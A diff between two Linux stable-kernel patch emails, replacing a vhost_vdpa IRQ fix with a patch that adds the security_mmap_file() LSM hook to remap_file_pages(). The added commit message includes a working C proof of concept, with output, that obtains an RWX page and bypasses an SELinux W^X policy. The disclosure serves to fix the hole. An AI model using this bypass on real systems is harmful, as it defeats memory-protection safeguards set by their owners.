@@ -1,39 +1,38 @@
 Received: from smtp.kernel.org (aws-us-west-2-korg-mail-1.web.codeaurora.org [10.30.226.201])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 2C1B71EA80;
-	Wed,  2 Oct 2024 14:43:36 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 4D4101974F4;
+	Wed,  2 Oct 2024 14:43:40 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=10.30.226.201
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1727880217; cv=none; b=B7MfpAj7rBxOxYFXgvX6H0oMmye6imekmLM+cJJdt1uekHz13hK+huoGwAG7VL25E9c+XW15qEtqLzTT0PpDYClRV9FzAhA2jkI8eUDjR/A0HknVg8i7grU+q1JCAyDEnnHMJCkAK1IkS7An03xbD/umlOMz9xRxnyFSxvgKia0=
+	t=1727880220; cv=none; b=am3NvAkksAIqd7rEA9vN+ESJs2jBk+tIzGqyMqv/DaauizsVLLGmcjbbBDQUDsEB2LDlx86rYShaha4dumzQuChfGl8YQi6rGWoCOtj8hd5JCJRpoSRFRM21XjK06BWwHKRZwQI/IQ+263jpSas83kDxAmQWxfoK/nM6164rgq8=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1727880217; c=relaxed/simple;
-	bh=+SUV2XJTd8mOc7AgHswa3p9/8JrsT2UWVfEhMextCFk=;
+	s=arc-20240116; t=1727880220; c=relaxed/simple;
+	bh=XKxN/wnqBO+NDZxJVPFws6orc6cM4n1zH/TxSweV8Uo=;
 	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
-	 MIME-Version; b=nQLvDjalQRxamxTODIXq8DWZHAhTv1OnMJZWZ8JrqXZLm8mc/xadvqndtFCkXZD1HTSaODfoRVcDX0e5P/rdUEdl7gEqxHSaOY7ikRupaXME88kz9hDEGkTWWOJDOplzx/uMAAk9V3rOz/hku3nXlMKKgULw4pUjK4uCCRP6lcI=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b=B+C0SW+K; arc=none smtp.client-ip=10.30.226.201
+	 MIME-Version; b=XoOMf3rhsQFc8gQMdvKW/SUyn9XQyd5r2oh+t1lY+ibXVK0JcZ6yZPQX/liHTFnv+kjhc630PxhaLeSORjQNsMHFmC2hbqOjgtYwR76OVaDIRuYpmaLwtqpiyjDZ1R0Pu5IVYML/uFTQbd/x/z9hzuk8bmKipy2jx+LxQlo4Wjk=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b=jFyMvHXq; arc=none smtp.client-ip=10.30.226.201
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b="B+C0SW+K"
-Received: by smtp.kernel.org (Postfix) with ESMTPSA id 673D9C4CEC2;
-	Wed,  2 Oct 2024 14:43:36 +0000 (UTC)
+	dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b="jFyMvHXq"
+Received: by smtp.kernel.org (Postfix) with ESMTPSA id C6B78C4CEC2;
+	Wed,  2 Oct 2024 14:43:39 +0000 (UTC)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=linuxfoundation.org;
-	s=korg; t=1727880216;
-	bh=+SUV2XJTd8mOc7AgHswa3p9/8JrsT2UWVfEhMextCFk=;
+	s=korg; t=1727880220;
+	bh=XKxN/wnqBO+NDZxJVPFws6orc6cM4n1zH/TxSweV8Uo=;
 	h=From:To:Cc:Subject:Date:In-Reply-To:References:From;
-	b=B+C0SW+KK3nBKVyt0M6xUmioXmI6rA1F8adLDDJ30kwzMQnbr6AYWawALLr27SiBh
-	 P4v7ZzrlFiePxbq6K/EmJgHqMZrMaF/NnHMIvVtVjN6M/Di0tdm54NITeLIc/GCHhb
-	 aYdvVSZR3/0O171ka9NXHhpVehU8UyCqGvQeaeeE=
+	b=jFyMvHXqXZbpnBPkJc1sXcyULgSoOUW/1vnaSy6RTQqslUBs5BqCSisiOFqFD9IUF
+	 qqOoCKUcS4ZPwmKtyvfiVjDnfT6M27buuDuWy8Da0GTiUu2cFyycGwd/de04beMCV+
+	 4NHWraTu4H5yuWv7x5nXZo2K/Dcz5lKKDwME/hLg=
 From: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
 To: stable@vger.kernel.org
 Cc: Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
 	patches@lists.linux.dev,
-	Dragos Tatulea <dtatulea@nvidia.com>,
-	Jason Wang <jasowang@redhat.com>,
-	"Michael S. Tsirkin" <mst@redhat.com>,
-	Sasha Levin <sashal@kernel.org>
-Subject: [PATCH 6.6 366/538] vhost_vdpa: assign irq bypass producer token correctly
-Date: Wed,  2 Oct 2024 15:00:05 +0200
-Message-ID: <20241002125806.874568612@linuxfoundation.org>
+	Shu Han <ebpqwerty472123@gmail.com>,
+	Stephen Smalley <stephen.smalley.work@gmail.com>,
+	Paul Moore <paul@paul-moore.com>
+Subject: [PATCH 6.6 384/538] mm: call the security_mmap_file() LSM hook in remap_file_pages()
+Date: Wed,  2 Oct 2024 15:00:23 +0200
+Message-ID: <20241002125807.588416884@linuxfoundation.org>
 X-Mailer: git-send-email 2.46.2
 In-Reply-To: <20241002125751.964700919@linuxfoundation.org>
 References: <20241002125751.964700919@linuxfoundation.org>
@@ -52,95 +51,77 @@ Content-Transfer-Encoding: 8bit
 
 ------------------
 
-From: Jason Wang <jasowang@redhat.com>
+From: Shu Han <ebpqwerty472123@gmail.com>
 
-[ Upstream commit 02e9e9366fefe461719da5d173385b6685f70319 ]
+commit ea7e2d5e49c05e5db1922387b09ca74aa40f46e2 upstream.
 
-We used to call irq_bypass_unregister_producer() in
-vhost_vdpa_setup_vq_irq() which is problematic as we don't know if the
-token pointer is still valid or not.
+The remap_file_pages syscall handler calls do_mmap() directly, which
+doesn't contain the LSM security check. And if the process has called
+personality(READ_IMPLIES_EXEC) before and remap_file_pages() is called for
+RW pages, this will actually result in remapping the pages to RWX,
+bypassing a W^X policy enforced by SELinux.
 
-Actually, we use the eventfd_ctx as the token so the life cycle of the
-token should be bound to the VHOST_SET_VRING_CALL instead of
-vhost_vdpa_setup_vq_irq() which could be called by set_status().
+So we should check prot by security_mmap_file LSM hook in the
+remap_file_pages syscall handler before do_mmap() is called. Otherwise, it
+potentially permits an attacker to bypass a W^X policy enforced by
+SELinux.
 
-Fixing this by setting up irq bypass producer's token when handling
-VHOST_SET_VRING_CALL and un-registering the producer before calling
-vhost_vring_ioctl() to prevent a possible use after free as eventfd
-could have been released in vhost_vring_ioctl(). And such registering
-and unregistering will only be done if DRIVER_OK is set.
+The bypass is similar to CVE-2016-10044, which bypass the same thing via
+AIO and can be found in [1].
 
-Reported-by: Dragos Tatulea <dtatulea@nvidia.com>
-Tested-by: Dragos Tatulea <dtatulea@nvidia.com>
-Reviewed-by: Dragos Tatulea <dtatulea@nvidia.com>
-Fixes: 2cf1ba9a4d15 ("vhost_vdpa: implement IRQ offloading in vhost_vdpa")
-Signed-off-by: Jason Wang <jasowang@redhat.com>
-Message-Id: <20240816031900.18013-1-jasowang@redhat.com>
-Signed-off-by: Michael S. Tsirkin <mst@redhat.com>
-Signed-off-by: Sasha Levin <sashal@kernel.org>
+The PoC:
+
+$ cat > test.c
+
+int main(void) {
+	size_t pagesz = sysconf(_SC_PAGE_SIZE);
+	int mfd = syscall(SYS_memfd_create, "test", 0);
+	const char *buf = mmap(NULL, 4 * pagesz, PROT_READ | PROT_WRITE,
+		MAP_SHARED, mfd, 0);
+	unsigned int old = syscall(SYS_personality, 0xffffffff);
+	syscall(SYS_personality, READ_IMPLIES_EXEC | old);
+	syscall(SYS_remap_file_pages, buf, pagesz, 0, 2, 0);
+	syscall(SYS_personality, old);
+	// show the RWX page exists even if W^X policy is enforced
+	int fd = open("/proc/self/maps", O_RDONLY);
+	unsigned char buf2[1024];
+	while (1) {
+		int ret = read(fd, buf2, 1024);
+		if (ret <= 0) break;
+		write(1, buf2, ret);
+	}
+	close(fd);
+}
+
+$ gcc test.c -o test
+$ ./test | grep rwx
+7f1836c34000-7f1836c35000 rwxs 00002000 00:01 2050 /memfd:test (deleted)
+
+Link: https://project-zero.issues.chromium.org/issues/42452389 [1]
+Cc: stable@vger.kernel.org
+Signed-off-by: Shu Han <ebpqwerty472123@gmail.com>
+Acked-by: Stephen Smalley <stephen.smalley.work@gmail.com>
+[PM: subject line tweaks]
+Signed-off-by: Paul Moore <paul@paul-moore.com>
+Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
 ---
- drivers/vhost/vdpa.c | 16 +++++++++++++---
- 1 file changed, 13 insertions(+), 3 deletions(-)
+ mm/mmap.c |    4 ++++
+ 1 file changed, 4 insertions(+)
 
-diff --git a/drivers/vhost/vdpa.c b/drivers/vhost/vdpa.c
-index da2c31ccc1380..c29a195a0175c 100644
---- a/drivers/vhost/vdpa.c
-+++ b/drivers/vhost/vdpa.c
-@@ -191,11 +191,9 @@ static void vhost_vdpa_setup_vq_irq(struct vhost_vdpa *v, u16 qid)
- 	if (irq < 0)
- 		return;
+--- a/mm/mmap.c
++++ b/mm/mmap.c
+@@ -3025,8 +3025,12 @@ SYSCALL_DEFINE5(remap_file_pages, unsign
+ 		flags |= MAP_LOCKED;
  
--	irq_bypass_unregister_producer(&vq->call_ctx.producer);
- 	if (!vq->call_ctx.ctx)
- 		return;
- 
--	vq->call_ctx.producer.token = vq->call_ctx.ctx;
- 	vq->call_ctx.producer.irq = irq;
- 	ret = irq_bypass_register_producer(&vq->call_ctx.producer);
- 	if (unlikely(ret))
-@@ -627,6 +625,14 @@ static long vhost_vdpa_vring_ioctl(struct vhost_vdpa *v, unsigned int cmd,
- 			vq->last_avail_idx = vq_state.split.avail_index;
- 		}
- 		break;
-+	case VHOST_SET_VRING_CALL:
-+		if (vq->call_ctx.ctx) {
-+			if (ops->get_status(vdpa) &
-+			    VIRTIO_CONFIG_S_DRIVER_OK)
-+				vhost_vdpa_unsetup_vq_irq(v, idx);
-+			vq->call_ctx.producer.token = NULL;
-+		}
-+		break;
- 	}
- 
- 	r = vhost_vring_ioctl(&v->vdev, cmd, argp);
-@@ -659,13 +665,16 @@ static long vhost_vdpa_vring_ioctl(struct vhost_vdpa *v, unsigned int cmd,
- 			cb.callback = vhost_vdpa_virtqueue_cb;
- 			cb.private = vq;
- 			cb.trigger = vq->call_ctx.ctx;
-+			vq->call_ctx.producer.token = vq->call_ctx.ctx;
-+			if (ops->get_status(vdpa) &
-+			    VIRTIO_CONFIG_S_DRIVER_OK)
-+				vhost_vdpa_setup_vq_irq(v, idx);
- 		} else {
- 			cb.callback = NULL;
- 			cb.private = NULL;
- 			cb.trigger = NULL;
- 		}
- 		ops->set_vq_cb(vdpa, idx, &cb);
--		vhost_vdpa_setup_vq_irq(v, idx);
- 		break;
- 
- 	case VHOST_SET_VRING_NUM:
-@@ -1316,6 +1325,7 @@ static int vhost_vdpa_open(struct inode *inode, struct file *filep)
- 	for (i = 0; i < nvqs; i++) {
- 		vqs[i] = &v->vqs[i];
- 		vqs[i]->handle_kick = handle_vq_kick;
-+		vqs[i]->call_ctx.ctx = NULL;
- 	}
- 	vhost_dev_init(dev, vqs, nvqs, 0, 0, 0, false,
- 		       vhost_vdpa_process_iotlb_msg);
--- 
-2.43.0
-
+ 	file = get_file(vma->vm_file);
++	ret = security_mmap_file(vma->vm_file, prot, flags);
++	if (ret)
++		goto out_fput;
+ 	ret = do_mmap(vma->vm_file, start, size,
+ 			prot, flags, 0, pgoff, &populate, NULL);
++out_fput:
+ 	fput(file);
+ out:
+ 	mmap_write_unlock(mm);
 
 
